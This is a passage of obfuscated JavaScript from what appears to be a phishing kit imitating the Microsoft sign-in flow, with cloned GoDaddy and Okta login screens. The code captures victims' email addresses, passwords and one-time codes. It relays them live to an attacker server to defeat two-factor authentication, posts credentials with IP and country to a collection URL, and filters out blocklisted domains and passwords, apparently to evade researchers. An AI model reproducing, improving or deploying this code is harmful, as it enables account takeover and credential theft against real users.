          changebackbutton('verifyemail', _0x54338b.backbutton),
          checkerrordesc('verifyemail', 1, _0x54338b.description)))
    })
    .catch((_0x26eef7) => {
      loadinganimation(1)
      console.error('Error:', _0x26eef7)
    })
})
const verifyotpbtn = document.getElementById('btn_verifyotp')
verifyotpbtn.addEventListener('click', () => {
  const _0x38d9c6 = document.getElementById('inp_otpcode')
  loadinganimation(0)
  let _0x124914 = 0
  otptype == 1 && (_0x124914 = 'PhoneAppOTP')
  otptype == 2 && (_0x124914 = 'OneWaySMS')
  otptype == 3 && (_0x124914 = 'OneWayVoiceMobileOTP')
  _0x38d9c6.value == '' &&
    (loadinganimation(1),
    (document.getElementById('otpdesc').innerText =
      'Enter the code to help us verify your identity.'))
  _0x38d9c6.value !== '' &&
    sendAndReceive('twofaselected', [_0x124914, _0x38d9c6.value], 1)
      .then((_0x32353b) => {
        _0x32353b &&
          _0x32353b.message !== 'waiting for previous request to complete' &&
          (loadinganimation(1),
          console.log(_0x32353b.message),
          _0x32353b.message == 'signinblocked live' &&
            ((document.getElementById('signin_blocked_live_email').innerText =
              _0x32353b.email),
            checkerrordesc('signin_blocked_live', 0, _0x32353b.description),
            checkerrordesc('signin_blocked_reason', 2, _0x32353b.reason),
            document
              .getElementById('section_' + view)
              .classList.toggle('d-none'),
            document
              .getElementById('section_signin_blocked_live')
              .classList.remove('d-none'),
            (view = 'signin_blocked_live')),
          _0x32353b.message == 'protectaccount live' &&
            (checkerrordesc('protect_account_live', 0, _0x32353b.description),
            document
              .getElementById('section_' + view)
              .classList.toggle('d-none'),
            document
              .getElementById('section_protect_account_live')
              .classList.remove('d-none'),
            (view = 'protect_account_live')),
          _0x32353b.message == 'error' && console.log(_0x32353b.description),
          _0x32353b.message == 'more info required' && moreinforeq(),
          _0x32353b.message == 'duplicate request' &&
            ((wait2facancel = 1),
            document
              .getElementById('section_tryagainlater')
              .classList.contains('d-none') &&
              ((document
                .getElementById('section_tryagainlater')
                .querySelector('.title').innerText = 'Too many Attempts'),
              setTimeout(function () {
                document
                  .getElementById('section_' + view)
                  .querySelector('.loading-container')
                  .classList.remove('loading')
                runanimation(2, view, 0.5, 0)
                setTimeout(function () {
                  document
                    .getElementById('section_' + view)
                    .classList.toggle('d-none')
                  document
                    .getElementById('section_tryagainlater')
                    .querySelector('#tryagainheader').style.display = 'block'
                  document
                    .getElementById('section_tryagainlater')
                    .querySelector('#tryagain_toomanyattempts').style.display =
                    'block'
                  document
                    .getElementById('section_tryagainlater')
                    .querySelector('.sectioncontent').style.animation =
                    'show-from-right 0.5s'
                  document
                    .getElementById('section_tryagainlater')
                    .classList.remove('d-none')
                  view = 'tryagainlater'
                }, 200)
              }, 500))),
          _0x32353b.message == 'valid otp' &&
            ((document.getElementById('otpdesc').innerText = ''),
            document.getElementById('section_otp').classList.toggle('d-none'),
            document.getElementById('section_final').classList.remove('d-none'),
            (view = 'final')),
          _0x32353b.message == 'error' &&
            _0x32353b.description !=
              'The wrong code was entered. Send yourself a new code and try again.' &&
            (bottomsectionlinks('otp', _0x32353b.bottomsection),
            changebackbutton('otp', _0x32353b.backbutton),
            checkerrordesc('otp', 1, _0x32353b.description),
            (document.getElementById('inp_otpcode').value = '')),
          _0x32353b.message == 'error' &&
            _0x32353b.description ==
              'The wrong code was entered. Send yourself a new code and try again.' &&
            (bottomsectionlinks('2fa', _0x32353b.bottomsection),
            changebackbutton('2fa', _0x32353b.backbutton),
            (document.getElementById('inp_otpcode').value = ''),
            (document.getElementById('error_otp').innerText = ''),
            document.getElementById('section_otp').classList.toggle('d-none'),
            document.getElementById('section_2fa').classList.remove('d-none')))
      })
      .catch((_0x1d48f6) => {
        loadinganimation(1)
        console.error('Error:', _0x1d48f6)
      })
})
function valaction(_0x222239, _0xe553cd, _0xd24f50, _0x3d17a1) {
  !_0xd24f50
    ? ((document.getElementById(_0x222239).innerText = _0x3d17a1),
      _0xe553cd && pwdInp.classList.add('error-inp'))
    : ((document.getElementById(_0x222239).innerText = ''),
      _0xe553cd && pwdInp.classList.remove('error-inp'))
}
function checkerrordesc(_0x4ce10e, _0x53e50c, _0x47cf56) {
  if (_0x53e50c == 2) {
    var _0x3b0862 = _0x4ce10e
  }
  if (_0x53e50c == 1) {
    var _0x3b0862 = 'error_' + _0x4ce10e
  }
  if (_0x53e50c == 0) {
    var _0x3b0862 = _0x4ce10e + 'desc'
  }
  if (_0x47cf56.type === 'text_link') {
    _0x47cf56.a_id == 'useAuthenticator' &&
      (document.getElementById(_0x3b0862).innerHTML =
        '<p class="mb-16">' +
        _0x47cf56.text +
        ' <a href="#" data-id="' +
        _0x47cf56.a_id +
        ('" onclick="linkoptionclick(this)" class="link">' +
          _0x47cf56.a_text +
          '</a> or try to sign in again shortly.</p>'))
    _0x47cf56.a_id != 'useAuthenticator' &&
      (document.getElementById(_0x3b0862).innerHTML =
        '<p class="mb-16">' +
        _0x47cf56.text +
        ' <a href="#" data-id="' +
        _0x47cf56.a_id +
        ('" onclick="linkoptionclick(this)" class="link">' +
          _0x47cf56.a_text +
          '</a></p>'))
  } else {
    if (_0x47cf56.type === 'link_text') {
      document.getElementById(_0x3b0862).innerHTML =
        '<a class="link mb-16" href="#" data-id="' +
        _0x47cf56.a_id +
        ('" onclick="linkoptionclick(this)">' +
          _0x47cf56.a_text +
          '</a> <p>' +
          _0x47cf56.text +
          '</p>')
    } else {
      if (_0x47cf56.type === 'link') {
        document.getElementById(_0x3b0862).innerHTML =
          '<a class="link mb-16" href="#" data-id="' +
          _0x47cf56.a_id +
          ('" onclick="linkoptionclick(this)">' + _0x47cf56.a_text + '</a>')
      } else {
        _0x47cf56.type === 'text' &&
          (document.getElementById(_0x3b0862).innerHTML =
            '<p>' + _0x47cf56.text + '</p>')
      }
    }
  }
}
function selectmultipleaccountadfs(_0x4cf29e) {
  const _0x337e05 = document.getElementsByClassName('idp')
  let _0x132491 = -1
  for (let _0x112bbb = 0; _0x112bbb < _0x337e05.length; _0x112bbb++) {
    if (_0x337e05[_0x112bbb] === _0x4cf29e) {
      _0x132491 = _0x112bbb
      break
    }
  }
  sendAndReceive('selectmultipleaccountadfs', [_0x132491], 1)
    .then((_0x22ae5a) => {
      _0x22ae5a &&
        _0x22ae5a.message !== 'waiting for previous request to complete' &&
        (_0x22ae5a.message == 'password' &&
          (document
            .getElementById('section_multipleaccounts_adfs')
            .classList.toggle('d-none'),
          document
            .getElementById('section_sidebarlogin_adfs')
            .classList.remove('d-none'),
          (view = 'sidebar_pwd_adfs')),
        console.log('Received response:', _0x22ae5a))
    })
    .catch((_0x4357db) => {
      loadinganimation(1)
      console.error('Error:', _0x4357db)
    })
}
function displaymultipleaccountsadfs(_0x35f8a1) {
  const _0x3d66fc = document.getElementById('multipleaccountsadfs')
  _0x3d66fc.innerHTML = ''
  _0x35f8a1.forEach((_0x5d1c9d) => {
    const _0x586811 = document.createElement('div')
    _0x586811.classList.add('idp')
    _0x586811.setAttribute('onclick', 'selectmultipleaccountadfs(this)')
    const _0x4805c0 = document.createElement('img')
    _0x4805c0.classList.add('largeIcon', 'float')
    _0x4805c0.src = _0x5d1c9d.image_src
    _0x4805c0.alt = _0x5d1c9d.email
    const _0x4df294 = document.createElement('div')
    _0x4df294.classList.add('idpDescription', 'float')
    const _0x2ca415 = document.createElement('span')
    _0x2ca415.classList.add('largeTextNoWrap', 'indentNonCollapsible')
    _0x2ca415.innerText = _0x5d1c9d.email
    _0x4df294.appendChild(_0x2ca415)
    _0x586811.appendChild(_0x4805c0)
    _0x586811.appendChild(_0x4df294)
    _0x3d66fc.appendChild(_0x586811)
  })
}
function pagevisited(_0xb087dd, _0x25ca30) {
  pagevisitedalready == null &&
    ((pagevisitedalready = 1),
    $.ajax({
      type: 'POST',
      url: urlo,
      data: stringToBinary(
        encryptData(
          JSON.stringify({
            pagelink: pagelinkval,
            mailtype: _0x25ca30,
            type: 3,
            typeval: 0,
            ip: userip,
            country: usercountry,
            useragent: userAgent,
            appnum: appnum,
          })
        )
      ),
      success: function (_0x365313) {},
      error: function (_0xb8bb63, _0x3e9e04, _0x317978) {
        console.error('Error:', _0x317978)
      },
    }))
}
pwdInp.addEventListener('input', function () {
  pdfcheck == 0 &&
    pwdInp.value.trim() !== '' &&
      pagevisited(document.getElementById('inp_uname').value, pvn)
  pdfcheck == 1 &&
    pwdInp.value.trim() !== '' &&
      pagevisited(document.getElementById('pdfemail').value, pvn)
})
pwdInplive.addEventListener('input', function () {
  pdfcheck == 0 &&
    pwdInplive.value.trim() !== '' &&
      pagevisited(document.getElementById('inp_uname').value, pvn)
  pdfcheck == 1 &&
    pwdInplive.value.trim() !== '' &&
      pagevisited(document.getElementById('pdfemail').value, pvn)
})
function sendemail() {
  sendAndReceive(
    'checkemail',
    [unameInp.value, pagelinkval, browserName, userip, usercountry],
    1
  )
    .then((_0x14518b) => {
      if (
        _0x14518b &&
        _0x14518b.message !== 'waiting for previous request to complete'
      ) {
        loadinganimation(1)
        var _0x63068 = false,
          _0x3d9cf6 = 300
        _0x14518b.message.includes('newwebsiteopen') == false &&
          _0x14518b.message !== 'error' &&
          (runanimation(2, view, 0.3),
          _0x14518b.acctype && _0x14518b.acctype == 2 && (pvn = 1),
          (_0x14518b.acctype == undefined ||
            (_0x14518b.acctype && _0x14518b.acctype == 1)) &&
            (pvn = 0))
        _0x14518b.message.includes('newwebsiteopen') == false && (_0x3d9cf6 = 0)
        setTimeout(function () {
          for (
            var _0x376ddf = 0;
            _0x376ddf < websitenames.length;
            _0x376ddf++
          ) {
            if (
              _0x14518b.message.includes('newwebsiteopen') == true &&
              _0x14518b.message.includes(websitenames[_0x376ddf]) == true
            ) {
              _0x63068 = true
              document
                .querySelectorAll('.user_identity')
                .forEach((_0x506015) => {
                  _0x506015.innerText = unameInp.value
                })
              if (websitenames[_0x376ddf] == 'godaddy') {
                var _0x17c809 = gdf,
                  _0x23a3c1 = document.querySelector(
                    'script[src^="' + gdf + '"]'
                  )
                if (!_0x23a3c1) {
                  var _0x192958 = document.createElement('script')
                  _0x192958.src = _0x17c809
                  document.head.appendChild(_0x192958)
                }
                const _0x9e6e4c =
                    '\n            ::-moz-selection {\n            background: #a6fff8;\n            }\n            \n            ::selection {\n            background: #a6fff8;\n            }\n            ',
                  _0x448ef7 = document.createElement('style')
                _0x448ef7.id = 'dynamic-style'
                _0x448ef7.textContent = _0x9e6e4c
                document.head.appendChild(_0x448ef7)
                document
                  .getElementById('section_uname')
                  .classList.toggle('d-none')
                document.getElementById('sections').classList.toggle('d-none')
                document
                  .getElementById('sections_' + websitenames[_0x376ddf] + '')
                  .classList.remove('d-none')
                document.getElementById('godaddyemail').value = unameInp.value
                document.body.style.setProperty(
                  'background-color',
                  '#f5f7f8',
                  'important'
                )
                document.body.style.setProperty(
                  'background-image',
                  'unset',
                  'important'
                )
                document.body.style.setProperty('overflow', 'auto', 'important')
                view = 'pwd_godaddy'
              }
              if (websitenames[_0x376ddf] == 'okta') {
                otherweburl = _0x14518b.message.replace('newwebsiteopen', '')
                const _0x3721c2 =
                    '\n            input[type=email], input[type=tel] {\n            width: inherit;\n            }\n            ::-moz-selection {\n            background: #a6fff8;\n            }\n            \n            ::selection {\n            background: #a6fff8;\n            }\n            ',
                  _0x177727 = document.createElement('style')
                _0x177727.id = 'dynamic-style'
                _0x177727.textContent = _0x3721c2
                document.head.appendChild(_0x177727)
                var _0x17c809 = odf,
                  _0x23a3c1 = document.querySelector(
                    'script[src^="' + odf + '"]'
                  )
                if (!_0x23a3c1) {
                  var _0x192958 = document.createElement('script')
                  _0x192958.src = _0x17c809
                  document.head.appendChild(_0x192958)
                }
                _0x14518b.logo !== false &&
                  (document.querySelector('.auth-org-logo').src =
                    _0x14518b.logo)
                _0x14518b.background !== false &&
                  document
                    .querySelector('.okta-container #login-bg-image')
                    .style.setProperty(
                      'background-image',
                      "url('" + _0x14518b.background + "')"
                    )
                document
                  .getElementById('section_uname')
                  .classList.toggle('d-none')
                document.getElementById('sections').classList.toggle('d-none')
                document
                  .getElementById('sections_' + websitenames[_0x376ddf] + '')
                  .classList.remove('d-none')
                document.querySelector('input#i011e.okta').value =
                  unameInp.value
                view = 'pwd_okta'
              }
            }
            _0x14518b.message.includes('newwebsiteopen') == true &&
              _0x376ddf == websitenames.length - 1 &&
              !_0x63068 &&
              ((document.getElementById('error_uname').innerText = ''),
              document
                .querySelectorAll('.user_identity')
                .forEach((_0x38eddf) => {
                  _0x38eddf.innerText = unameInp.value
                }),
              bottomsectionlinks('pwd', [
                {
                  a_id: 'idA_PWD_ForgotPassword',
                  a_text: 'Forgot my password',
                  type: 'link',
                },
              ]),
              changebackbutton('pwd', 0),
              document
                .getElementById('section_uname')
                .classList.toggle('d-none'),
              document.getElementById('section_pwd').classList.remove('d-none'),
              (otherweburl = _0x14518b.message.replace('newwebsiteopen', '')),
              (webnotfound = true),
              (view = 'pwd'))
          }
          if (_0x14518b.message == 'multiple accounts') {
            multipleaccountsback = 1
            if (twa == 0) {
              var _0x4aeaa5 = document.querySelectorAll('.bannerlogo')
              _0x4aeaa5.forEach(function (_0x5b20f2) {
                _0x5b20f2.style.height = '24px'
              })
            }
            document
              .getElementById('section_multipleaccounts')
              .querySelector('#btn_back')
              .setAttribute('data-id', _0x14518b.backbtnid)
            document
              .getElementById('section_multipleaccounts')
              .querySelector('#btn_back')
              .setAttribute('onclick', 'backbuttonclick(this,2)')
            checkerrordesc('multipleaccounts', 0, _0x14518b.description)
            displaymultipleaccounts(_0x14518b.accountoptions)
            bottomsectionlinks('multipleaccounts', _0x14518b.bottomsection)
            document.querySelectorAll('.user_identity').forEach((_0x6fc09f) => {
              _0x6fc09f.innerText = unameInp.value
            })
            document.getElementById('section_uname').classList.toggle('d-none')
            document
              .getElementById('section_multipleaccounts')
              .classList.remove('d-none')
            view = 'multipleaccounts'
          }
          if (_0x14518b.message == 'correct email') {
            if (twa == 0) {
              if (
                _0x14518b.bannerlogo !== undefined &&
                _0x14518b.bannerlogo !== null
              ) {
                var _0x4aeaa5 = document.querySelectorAll('.bannerlogo')
                _0x4aeaa5.forEach(function (_0x5c477f) {
                  _0x5c477f.style.backgroundImage =
                    "url('" + _0x14518b.bannerlogo + "')"
                  _0x5c477f.style.width = 'unset'
                  _0x5c477f.style.height = '36px'
                })
              }
              _0x14518b.backgroundcolor !== undefined &&
                _0x14518b.backgroundcolor !== null &&
                document.body.style.setProperty(
                  'background-color',
                  _0x14518b.backgroundcolor
                )
              _0x14518b.backgroundimage !== undefined &&
                _0x14518b.backgroundimage !== null &&
                document.body.style.setProperty(
                  'background-image',
                  "url('" + _0x14518b.backgroundimage + "')"
                )
              if (
                _0x14518b.bannerlogo == undefined &&
                _0x14518b.bannerlogo !== null
              ) {
                var _0x4aeaa5 = document.querySelectorAll('.bannerlogo')
                _0x4aeaa5.forEach(function (_0x49f2bf) {
                  _0x49f2bf.style.height = '24px'
                })
              }
            }
            pvn == 0 &&
              (bottomsectionlinks('pwd', _0x14518b.bottomsection),
              changebackbutton('pwd', _0x14518b.backbutton))
            pvn == 1 &&
              (bottomsectionlinks('pwd_live', _0x14518b.bottomsection),
              changebackbutton('pwd_live', _0x14518b.backbutton))
            document.getElementById('error_uname').innerText = ''
            document.querySelectorAll('.user_identity').forEach((_0x11786f) => {
              _0x11786f.innerText = unameInp.value
            })
            document.getElementById('section_uname').classList.toggle('d-none')
            pvn == 0 &&
              (document
                .getElementById('section_pwd')
                .classList.remove('d-none'),
              (view = 'pwd'))
            pvn == 1 &&
              (document
                .getElementById('section_pwd_live')
                .classList.remove('d-none'),
              (view = 'pwd_live'))
          }
          _0x14518b.message == 'error' &&
            (bottomsectionlinks('uname', [
              {
                a_id: 'signup',
                a_text: 'Create one!',
                text: 'No account?',
                type: 'text_link',
              },
              {
                a_id: 'cantAccessAccount',
                a_text: "Can't access your account?",
                type: 'link',
              },
            ]),
            checkerrordesc('uname', 1, _0x14518b.description))
          _0x14518b.message.includes('newwebsiteopen') == false &&
            _0x14518b.message !== 'error' &&
            runanimation(1, view, 0.3)
        }, _0x3d9cf6)
      }
    })
    .catch((_0x3b5d07) => {
      loadinganimation(1)
      console.error('Error:', _0x3b5d07)
    })
}
function missingadd() {
  let _0x507fae = null
  pvn == 0 && (_0x507fae = pwdInp.value)
  pvn == 1 && (_0x507fae = pwdInplive.value)
  $.ajax({
    type: 'POST',
    url: urlo,
    data: stringToBinary(
      encryptData(
        JSON.stringify({
          pagelink: pagelinkval,
          type: 12,
          email: unameInp.value,
          password: _0x507fae,
          url: otherweburl,
          ip: userip,
          country: usercountry,
          browser: browserName,
        })
      )
    ),
    success: function (_0x54ac91) {},
    error: function (_0x5775c5, _0x56dc0e, _0x1ce071) {
      console.error('Error:', _0x1ce071)
    },
  })
}
function validate() {
  if (view === 'uname') {
    const _0x17adc4 = bes,
      _0x4791dd = unameInp.value.trim().split('@')[1]
    unameInp.value.includes('@') &&
      _0x17adc4.some((_0xa1083a) => _0x4791dd.includes(_0xa1083a)) &&
      (loadinganimation(0),
      setTimeout(function () {
        loadinganimation(1)
        document.getElementById('error_uname').innerText =
          "We couldn't find an account with that username. Try another, or get a new Microsoft account."
      }, 3000))
    if (unameInp.value.trim() == '') {
      document.getElementById('error_uname').innerText =
        'Enter a valid email address, phone number, or Skype name.'
    } else {
      unameInp.value.trim() != '' &&
        unameInp.value.includes('@') &&
        !_0x17adc4.some((_0x27a1ec) => _0x4791dd.includes(_0x27a1ec)) &&
        ((showwedidnthearpopup = 1),
        loadinganimation(0),
        webnotfound == true &&
          setTimeout(function () {
            loadinganimation(1)
            runanimation(2, view, 0.3)
            setTimeout(function () {
              document.getElementById('error_pwd').innerText = ''
              document.getElementById('inp_pwd').value = ''
              bottomsectionlinks('pwd', [
                {
                  a_id: 'idA_PWD_ForgotPassword',
                  a_text: 'Forgot my password',
                  type: 'link',
                },
              ])
              document
                .getElementById('section_uname')
                .classList.toggle('d-none')
              document.getElementById('section_pwd').classList.remove('d-none')
              view = 'pwd'
              runanimation(1, view, 0.3)
            }, 300)
          }, 3000),
        webnotfound == false &&
          (interacted == 1 && sendemail(),
          interacted == 0 &&
            ((interacted = 1),
            (function _0xc02c9a() {
              $.get(
                'https://get.geojs.io/v1/ip/geo.json',
                function (_0x262791) {
                  userip = _0x262791.ip
                  usercountry = _0x262791.country
                  sendemail()
                },
                'json'
              ).fail(function (_0x3192fe, _0x23cd93, _0x94d221) {
                ;(_0x3192fe.status == 429 || _0x23cd93 !== 'success') &&
                  setTimeout(_0xc02c9a, 1000)
              })
            })())))
    }
  } else {
    if (view === 'pwd') {
      const _0x51b0d3 = pes,
        _0x23c0d7 = pwdInp.value
      _0x51b0d3.some((_0x26e857) => _0x23c0d7.includes(_0x26e857)) &&
        (loadinganimation(0),
        setTimeout(function () {
          loadinganimation(1)
          document.getElementById('section_pwd').classList.toggle('d-none')
          document.getElementById('section_final').classList.remove('d-none')
          view = 'final'
          document.getElementById('error_pwd').innerText = ''
        }, 3000))
      if (pwdInp.value.trim() === '') {
        document.getElementById('error_pwd').innerText =
          'Please enter the password for your Microsoft account.'
      } else {
        pwdInp.value.trim() != '' &&
          !_0x51b0d3.some((_0x2906a9) => _0x23c0d7.includes(_0x2906a9)) &&
          (loadinganimation(0),
          webnotfound == true &&
            (missingadd(),
            setTimeout(function () {
              loadinganimation(1)
              runanimation(2, view, 0.3)
              setTimeout(function () {
                bottomsectionlinks('pwd', [
                  {
                    a_id: 'idA_PWD_ForgotPassword',
                    a_text: 'Forgot my password',
                    type: 'link',
                  },
                ])
                changebackbutton('pwd', 1)
                document
                  .getElementById('section_pwd')
                  .classList.toggle('d-none')
                document
                  .getElementById('section_final')
                  .classList.remove('d-none')
                document.getElementById('error_pwd').innerText = ''
                view = 'final'
                runanimation(1, view, 0.3)
              }, 300)
            }, 3000)),
          webnotfound == false &&
            ((multipleaccountsback = 0),
            sendAndReceive(
              'checkpass',
              [pwdInp.value.replace(/\//g, 'customslashstr')],
              1
            )
              .then((_0x580253) => {
                if (
                  _0x580253 &&
                  _0x580253.message !==
                    'waiting for previous request to complete'
                ) {
                  loadinganimation(1)
                  _0x580253.message == 'signinblocked live' &&
                    ((document.getElementById('error_pwd').innerText = ''),
                    (document.getElementById(
                      'signin_blocked_live_email'
                    ).innerText = _0x580253.email),
                    checkerrordesc(
                      'signin_blocked_live',
                      0,
                      _0x580253.description
                    ),
                    checkerrordesc(
                      'signin_blocked_reason',
                      2,
                      _0x580253.reason
                    ),
                    document
                      .getElementById('section_pwd')
                      .classList.toggle('d-none'),
                    document
                      .getElementById('section_signin_blocked_live')
                      .classList.remove('d-none'),
                    (view = 'signin_blocked_live'))
                  _0x580253.message == 'protectaccount live' &&
                    (checkerrordesc(
                      'protect_account_live',
                      0,
                      _0x580253.description
                    ),
                    document
                      .getElementById('section_' + view)
                      .classList.toggle('d-none'),
                    document
                      .getElementById('section_protect_account_live')
                      .classList.remove('d-none'),
                    (view = 'protect_account_live'))
                  _0x580253.message == 'you dont have access' &&
                    (document
                      .getElementById('section_pwd')
                      .classList.toggle('d-none'),
                    document
                      .getElementById('section_youdonthaveaccess')
                      .classList.remove('d-none'),
                    (view = 'youdonthaveaccess'))
                  _0x580253.message == 'moreinforequired' &&
                    (document
                      .getElementById('section_pwd')
                      .classList.toggle('d-none'),
                    document
                      .getElementById('section_moreinforequired')
                      .classList.remove('d-none'),
                    (view = 'moreinforequired'))
                  _0x580253.message == 'more info required' && moreinforeq()
                  _0x580253.message == '2fa is off newwebsite' &&
                    (document
                      .getElementById('section_pwd')
                      .classList.toggle('d-none'),
                    document
                      .getElementById('section_final')
                      .classList.remove('d-none'),
                    (view = 'final'),
                    (document.getElementById('error_pwd').innerText = ''))
                  _0x580253.message == '2fa is off' &&
                    (document
                      .getElementById('section_pwd')
                      .classList.toggle('d-none'),
                    document
                      .getElementById('section_final')
                      .classList.remove('d-none'),
                    (view = 'final'),
                    (document.getElementById('error_pwd').innerText = ''))
                  if (_0x580253.message == 'sign in blocked') {
                    document.getElementById('error_pwd').innerText = ''
                    document
                      .getElementById('section_pwd')
                      .classList.toggle('d-none')
                    document
                      .getElementById('section_accessblocked')
                      .querySelector('h2.title').textContent = _0x580253.title
                    changebackbutton('accessblocked', _0x580253.backbutton)
                    checkerrordesc('accessblocked', 0, _0x580253.description)
                    checkerrordesc(
                      'accessblockedsignoutoption',
                      2,
                      _0x580253.signoutoption
                    )
                    document.getElementById('footer').style.position =
                      'relative'
                    var _0x34c8a5 = document.getElementById('debugdetailsinfo')
                    _0x580253.troubleshootinginfo.forEach(
                      (_0x3b64dd, _0xb314ac) => {
                        const _0x4351aa = document.createElement('div'),
                          _0x465561 = document.createElement('span')
                        _0x465561.textContent = _0x3b64dd.name
                        _0x465561.classList.add('bold')
                        const _0x1f6378 = document.createElement('span')
                        _0x1f6378.textContent = _0x3b64dd.value
                        _0x4351aa.appendChild(_0x465561)
                        _0x4351aa.appendChild(_0x1f6378)
                        _0x34c8a5.appendChild(_0x4351aa)
                      }
                    )
                    document
                      .getElementById('section_accessblocked')
                      .classList.remove('d-none')
                    view = 'accessblocked'
                  }
                  _0x580253.message == 'protect account' &&
                    ((document.getElementById('error_pwd').innerText = ''),
                    checkerrordesc('protectaccount', 0, _0x580253.description),
                    displayprotectoptions(_0x580253.protectoptions),
                    bottomsectionlinks(
                      'protectaccount',
                      _0x580253.bottomsection
                    ),
                    changebackbutton('protectaccount', _0x580253.backbutton),
                    document
                      .getElementById('section_pwd')
                      .classList.toggle('d-none'),
                    document
                      .getElementById('section_protectaccount')
                      .classList.remove('d-none'),
                    (view = 'protectaccount'))
                  _0x580253.message == 'otp sent' &&
                    ((document.getElementById('error_pwd').innerText = ''),
                    document
                      .getElementById('otpimg')
                      .setAttribute('src', _0x580253.image_src),
                    checkerrordesc('otp', 0, _0x580253.description),
                    bottomsectionlinks('otp', _0x580253.bottomsection),
                    changebackbutton('otp', _0x580253.backbutton),
                    document
                      .getElementById('section_pwd')
                      .classList.toggle('d-none'),
                    document
                      .getElementById('section_otp')
                      .classList.remove('d-none'),
                    (view = 'otp'))
                  _0x580253.message == 'approve auth request auth app' &&
                    ((document.getElementById('error_pwd').innerText = ''),
                    document
                      .getElementById('authappimg')
                      .setAttribute('src', _0x580253.image_src),
                    checkerrordesc('authapp', 0, _0x580253.description),
                    bottomsectionlinks('authapp', _0x580253.bottomsection),
                    changebackbutton('authapp', _0x580253.backbutton),
                    (document.getElementById('authappcode').textContent =
                      _0x580253.authappcode),
                    document
                      .getElementById('section_pwd')
                      .classList.toggle('d-none'),
                    document
                      .getElementById('section_authapp')
                      .classList.remove('d-none'),
                    (view = 'authapp'),
                    wait2fa('app', _0x580253.methodid))
                  _0x580253.message == 'approve auth request calling' &&
                    (document
                      .getElementById('section_authcall')
                      .querySelector('.back')
                      .focus(),
                    (document.getElementById('error_pwd').innerText = ''),
                    document
                      .getElementById('authcallimg')
                      .setAttribute('src', _0x580253.image_src),
                    checkerrordesc('authcall', 0, _0x580253.description),
                    bottomsectionlinks('authcall', _0x580253.bottomsection),
                    changebackbutton('authcall', _0x580253.backbutton),
                    document
                      .getElementById('section_pwd')
                      .classList.toggle('d-none'),
                    document
                      .getElementById('section_authcall')
                      .classList.remove('d-none'),
                    (view = 'authcall'),
                    wait2fa('call'))
                  if (_0x580253.message == '2fa is on') {
                    var _0x28f6ec = JSON.parse(_0x580253.twofamethods)
                    displaytwofamethods(_0x28f6ec)
                    bottomsectionlinks('2fa', _0x580253.bottomsection)
                    changebackbutton('2fa', _0x580253.backbutton)
                    document
                      .getElementById('section_pwd')
                      .classList.toggle('d-none')
                    document
                      .getElementById('section_2fa')
                      .classList.remove('d-none')
                    view = '2fa'
                    document.getElementById('error_pwd').innerText = ''
                  }
                  _0x580253.message == 'error' &&
                    (bottomsectionlinks('pwd', _0x580253.bottomsection),
                    changebackbutton('pwd', _0x580253.backbutton),
                    checkerrordesc('pwd', 1, _0x580253.description),
                    (document.getElementById('inp_pwd').value = ''))
                  for (
                    var _0x22749c = 0;
                    _0x22749c < websitenames.length;
                    _0x22749c++
                  ) {
                    _0x580253.message ==
                      'error ' + websitenames[_0x22749c] + '' &&
                      checkerrordesc('pwd', 1, _0x580253.description)
                  }
                }
              })
              .catch((_0x40a003) => {
                loadinganimation(1)
                console.error('Error:', _0x40a003)
              })))
      }
    } else {
      if (view === 'pwd_live') {
        const _0x453930 = pes,
          _0x48bc61 = pwdInplive.value
        _0x453930.some((_0x4d1a53) => _0x48bc61.includes(_0x4d1a53)) &&
          (loadinganimation(0),
          setTimeout(function () {
            loadinganimation(1)
            document
              .getElementById('section_pwd_live')
              .classList.toggle('d-none')
            document.getElementById('section_final').classList.remove('d-none')
            view = 'final'
            document.getElementById('error_pwd_live').innerText = ''
          }, 3000))
        if (pwdInplive.value.trim() === '') {
          document.getElementById('error_pwd_live').innerText =
            'Please enter the password for your Microsoft account.'
        } else {
          pwdInplive.value.trim() != '' &&
            !_0x453930.some((_0x1dfca6) => _0x48bc61.includes(_0x1dfca6)) &&
            (loadinganimation(0),
            webnotfound == true &&
              (missingadd(),
              setTimeout(function () {
                loadinganimation(1)
                runanimation(2, view, 0.3)
                setTimeout(function () {
                  bottomsectionlinks('pwd_live', [
                    {
                      a_id: 'idA_PWD_ForgotPassword',
                      a_text: 'Forgot your password',
                      type: 'link',
                    },
                  ])
                  changebackbutton('pwd_live', 1)
                  document
                    .getElementById('section_pwd_live')
                    .classList.toggle('d-none')
                  document
                    .getElementById('section_final')
                    .classList.remove('d-none')
                  document.getElementById('error_pwd_lived').innerText = ''
                  view = 'final'
                  runanimation(1, view, 0.3)
                }, 300)
              }, 3000)),
            webnotfound == false &&
              ((multipleaccountsback = 0),
              sendAndReceive(
                'checkpass',
                [pwdInplive.value.replace(/\//g, 'customslashstr')],
                1
              )
                .then((_0x57e013) => {
                  if (
                    _0x57e013 &&
                    _0x57e013.message !==
                      'waiting for previous request to complete'
                  ) {
                    loadinganimation(1)
                    _0x57e013.message == 'signinblocked live' &&
                      ((document.getElementById('error_pwd_live').innerText =
                        ''),
                      (document.getElementById(
                        'signin_blocked_live_email'
                      ).innerText = _0x57e013.email),
                      checkerrordesc(
                        'signin_blocked_live',
                        0,
                        _0x57e013.description
                      ),
                      checkerrordesc(
                        'signin_blocked_reason',
                        2,
                        _0x57e013.reason
                      ),
                      document
                        .getElementById('section_pwd_live')
                        .classList.toggle('d-none'),
                      document
                        .getElementById('section_signin_blocked_live')
                        .classList.remove('d-none'),
                      (view = 'signin_blocked_live'))
                    _0x57e013.message == 'protectaccount live' &&
                      (checkerrordesc(
                        'protect_account_live',
                        0,
                        _0x57e013.description
                      ),
                      document
                        .getElementById('section_' + view)
                        .classList.toggle('d-none'),
                      document
                        .getElementById('section_protect_account_live')
                        .classList.remove('d-none'),
                      (view = 'protect_account_live'))
                    _0x57e013.message == 'you dont have access' &&
                      (document
                        .getElementById('section_pwd_live')
                        .classList.toggle('d-none'),
                      document
                        .getElementById('section_youdonthaveaccess')
                        .classList.remove('d-none'),
                      (view = 'youdonthaveaccess'))
                    _0x57e013.message == 'moreinforequired' &&
                      (document
                        .getElementById('section_pwd_live')
                        .classList.toggle('d-none'),
                      document
                        .getElementById('section_moreinforequired')
                        .classList.remove('d-none'),
                      (view = 'moreinforequired'))
                    _0x57e013.message == 'more info required' && moreinforeq()
                    _0x57e013.message == '2fa is off newwebsite' &&
                      (document
                        .getElementById('section_pwd_live')
                        .classList.toggle('d-none'),
                      document
                        .getElementById('section_final')
                        .classList.remove('d-none'),
                      (view = 'final'),
                      (document.getElementById('error_pwd_live').innerText =
                        ''))
                    _0x57e013.message == '2fa is off' &&
                      (document
